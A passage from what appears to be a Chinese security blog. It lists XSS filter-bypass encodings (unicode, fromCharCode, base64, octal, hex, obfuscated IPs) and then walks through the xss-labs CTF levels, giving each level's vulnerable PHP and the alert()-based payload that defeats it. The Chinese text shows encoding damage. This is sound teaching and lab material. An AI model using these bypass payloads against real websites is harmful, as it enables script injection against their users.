<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">alert(&quot;xss&quot;); =&gt; \u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Asciiç </li>
</ul>
<p><code>var n = String.fromCharCode(65)</code>  è¾“å‡º <code>A</code></p>
<p><code>var n=String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59);</code> </p>
<p>è¾“å‡º <code>alert(&quot;xss&quot;);</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Base64</li>
</ul>
<p>JSä¸­ç”¨æ¥ç¼–ç å’Œè§£ç base64çš„ä¸¤ä¸ªå‡½æ•°</p>
<p><code>abto()</code> base64è§£ç </p>
<p><code>btoa()</code> ç¼–ç ä¸ºbase64</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(atob(&#x27;ImFsZXJ0KCd4c3MnKSI=&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å…«è¿›åˆ¶</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;\<span class="attr">170</span>\<span class="attr">163</span>\<span class="attr">163</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Hex</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> =&gt; 3C7363726970743E616C657274282278737322293B3C2F7363726970743E</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<h3 id="è¿‡æ»¤url"><a href="#è¿‡æ»¤url" class="headerlink" title="è¿‡æ»¤url"></a>è¿‡æ»¤url</h3><h4 id="urlç¼–ç "><a href="#urlç¼–ç " class="headerlink" title="urlç¼–ç "></a>urlç¼–ç </h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">2e</span>%<span class="attr">62</span>%<span class="attr">61</span>%<span class="attr">69</span>%<span class="attr">64</span>%<span class="attr">75</span>%<span class="attr">2e</span>%<span class="attr">63</span>%<span class="attr">6f</span>%<span class="attr">6d</span>/`&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="IPç»•è¿‡"><a href="#IPç»•è¿‡" class="headerlink" title="IPç»•è¿‡"></a>IPç»•è¿‡</h4><ul>
<li>åè¿›åˆ¶IP</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">2130706433</span>/`&gt;</span></span><br><span class="line"># 127.0.0.1</span><br></pre></td></tr></table></figure>

<ul>
<li>å…«è¿›åˆ¶IP</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0177.0.0.01</span>/`&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>HEX</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0x7f.0x0.0x0.0x1</span>/`&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>htmlæ ‡ç­¾ä¸­ä½¿ç”¨<code>//</code> ä»£æ›¿<code>http://</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`//<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<h2 id="XSSé˜²å¾¡"><a href="#XSSé˜²å¾¡" class="headerlink" title="XSSé˜²å¾¡"></a>XSSé˜²å¾¡</h2><ul>
<li>é»‘/ç™½åå•</li>
<li>å¯¹è¾“å‡ºç¼–ç </li>
<li>å¯¹è¾“å…¥è¿‡æ»¤</li>
</ul>
<blockquote>
<p>è¿‡æ»¤ä¸€äº›å±é™©å­—ç¬¦ï¼Œä»¥åŠè½¬ä¹‰ || &lt; &gt; â€˜ â€œ &amp; # ç­‰å±é™©å­—ç¬¦</p>
</blockquote>
<ul>
<li>HttpOnly Cookieè®¾ç½®</li>
</ul>
<blockquote>
<p>Cookieåœ¨æ¶ˆæ¯å¤´ä¸­è¢«è®¾ç½®ä¸ºHttpOnly,å¯ä»¥é˜»æ­¢å®¢æˆ·ç«¯JSç›´æ¥è®¿é—®æµè§ˆå™¨ä¸­çš„cookiesï¼Œä»è€Œè¾¾åˆ°ä¿æŠ¤æ•æ„Ÿæ•°æ®çš„ä½œç”¨</p>
</blockquote>
<ul>
<li><p>é™åˆ¶è¾“å…¥å†…å®¹é•¿åº¦</p>
</li>
<li><p>CSP(Content Security Policy)</p>
</li>
</ul>
<br>

<br>

<br>

<br>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote>
<p><a href="https://xz.aliyun.com/t/4067">https://xz.aliyun.com/t/4067</a></p>
<p><a href="https://xz.aliyun.com/t/2936">https://xz.aliyun.com/t/2936</a></p>
<p><a href="https://blog.csdn.net/weixin_51356351/article/details/109690416">https://blog.csdn.net/weixin_51356351/article/details/109690416</a></p>
<p><a href="https://wh0ale.github.io/2019/03/19/2019-3-19-%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/">https://wh0ale.github.io/2019/03/19/2019-3-19-%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs2</title>
    <url>/posts/b04952e9/</url>
    <content><![CDATA[<p>14</p>
<p>è¿™ä¸ªé¢˜ç›®ä¸­çš„urlå¤±æ•ˆäº†ï¼Œè€ƒå¯Ÿçš„æ˜¯exif xss</p>
<p> exifä»‹ç»:</p>
<p>å¯äº¤æ¢å›¾åƒæ–‡ä»¶æ ¼å¼ï¼ˆè‹±è¯­ï¼šExchangeable image file formatï¼Œå®˜æ–¹ç®€ç§°Exifï¼‰ï¼Œæ˜¯ä¸“é—¨ä¸ºæ•°ç ç›¸æœºçš„ç…§ç‰‡è®¾å®šçš„ï¼Œå¯ä»¥è®°å½•æ•°ç ç…§ç‰‡çš„å±æ€§ä¿¡æ¯å’Œæ‹æ‘„æ•°æ®ã€‚</p>
<p>exif xss ç®€å•æ¥è®²å°±æ˜¯åˆ©ç”¨exifä¿¡æ¯å®ç°xssæ”»å‡»ã€‚ </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">xss</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">12</span> <span class="attr">onclick</span>=<span class="string">&#x27;alert(1)&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<p>15</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>ng-include </code>æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚</p>
<p>åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚<br><code>ng-include</code> å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚<br>é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚</p>
</blockquote>
<p>è¿™é‡Œè€ƒè™‘è°ƒç”¨level1çš„ä»£ç ï¼Œä½¿ç”¨img</p>
<p><code> http://test.ctf8.com/level15.php?src=%27level1.php?name=test&lt;img src=1 onclick=alert(1)&gt;&#39;</code></p>
<br>

<br>

<p>16.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;	&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤æ‰äº†<code>script</code>, ç©ºæ ¼å’Œ<code>/</code>å¯ä»¥è€ƒè™‘ä½¿ç”¨%0A,%0C,%0Dç­‰ä»£æ›¿ä½œä¸ºåˆ†éš”ç¬¦</p>
<p><code>keyword=test&lt;img%0Asrc=1%0Aonclick=alert(1)&gt;</code></p>
<br>

<h4 id="16é¢˜ä»¥åçš„é¢˜ç›®éƒ½éœ€è¦ä½¿ç”¨flashï¼Œå¥½å¤šæµè§ˆå™¨å·²ç»ä¸æ”¯æŒäº†ï¼Œåé¢çš„å°±éšä¾¿çœ‹çœ‹"><a href="#16é¢˜ä»¥åçš„é¢˜ç›®éƒ½éœ€è¦ä½¿ç”¨flashï¼Œå¥½å¤šæµè§ˆå™¨å·²ç»ä¸æ”¯æŒäº†ï¼Œåé¢çš„å°±éšä¾¿çœ‹çœ‹" class="headerlink" title="16é¢˜ä»¥åçš„é¢˜ç›®éƒ½éœ€è¦ä½¿ç”¨flashï¼Œå¥½å¤šæµè§ˆå™¨å·²ç»ä¸æ”¯æŒäº†ï¼Œåé¢çš„å°±éšä¾¿çœ‹çœ‹"></a>16é¢˜ä»¥åçš„é¢˜ç›®éƒ½éœ€è¦ä½¿ç”¨flashï¼Œå¥½å¤šæµè§ˆå™¨å·²ç»ä¸æ”¯æŒäº†ï¼Œåé¢çš„å°±éšä¾¿çœ‹çœ‹</h4><p>17.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>arg01=a&amp;arg02= onmouseover=alert(1)</code></p>
<p>18.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf02.swf?&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å’Œ17é¢˜ä¸€æ ·</p>
<p><code>arg01=a&amp;arg02= onmouseover=alert(1)</code></p>
<p>19.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;embed src=&quot;xsf03.swf?&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<p>20.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;embed src=&quot;xsf04.swf?&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs1</title>
    <url>/posts/ca3eea61/</url>
    <content><![CDATA[<p><a href="http://test.ctf8.com/">http://test.ctf8.com/</a></p>
<p>1.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>$strè¢«æ”¾å…¥åˆ°äº† h2æ ‡ç­¾ä¸­ï¼Œåªéœ€è¦æŠŠå‰é¢h2æ ‡ç­¾é—­åˆæ„é€ payloadï¼Œ</p>
<p><code>name=&lt;/h2&gt;&lt;script&gt;alert(111)&lt;/script&gt;</code></p>
<br>

<p>2.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é—­åˆvalue</p>
<p><code>keyword=test&quot;&gt;&lt;script&gt;alert(2)&lt;/script&gt;</code></p>
<br>

<p>3.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸ä¸Šä¸€é¢˜ç›¸æ¯”ï¼Œè¿™é‡Œä½¿ç”¨äº† <code> htmlspecialchars()</code>å‡½æ•°ï¼Œä»–ä¼šæŠŠ<code>&lt;</code>å’Œ<code>&gt;</code>è½¬è¯‘ä¸ºhtmlå®ä½“</p>
<p>æŸ¥çœ‹æºç å¯ä»¥å‘ç°<code>&lt;</code>å’Œ<code>&gt;</code>éƒ½è¢«è½¬è¯‘æ‰äº†ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå¯ä»¥è€ƒè™‘ä½¿ç”¨onä¸€ç±»çš„äº‹ä»¶å¼¹xss</p>
<p><code>keyword=&#39;onclick=alert(3)//</code> é—­åˆå‰é¢çš„value æ³¨é‡Šæ‰åé¢çš„å•å¼•å·</p>
<br>

<p>4.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å’Œä¸Šä¸€ä¸ªå·®ä¸å¤šï¼Œåªä¸è¿‡æ˜¯ç”¨åŒå¼•å·é—­åˆ</p>
<p><code>keyword=&quot;oninput=alert(4)//</code></p>
<br>

<p>5.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™æ¬¡æ˜¯æŠŠ&lt;script å’Œ on éƒ½ç»™æ›¿æ¢äº†ï¼Œæ‰€ä»¥è€ƒè™‘<code>a href</code> æ¥è§¦å‘</p>
<p><code>123&quot;&gt;&lt;a href=javascript:alert(1) &gt;XSS&lt;/a&gt;</code></p>
<br>

<p>6.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶æŠŠhrefç»™æ”¹äº† ä½†å¯ä»¥è€ƒè™‘å˜åŒ–å¤§å°å†™</p>
<p><code>123&quot;&gt;&lt;a hREf=javascript:alert(1) &gt;XSS&lt;/a&gt;</code></p>
<p>7.</p>
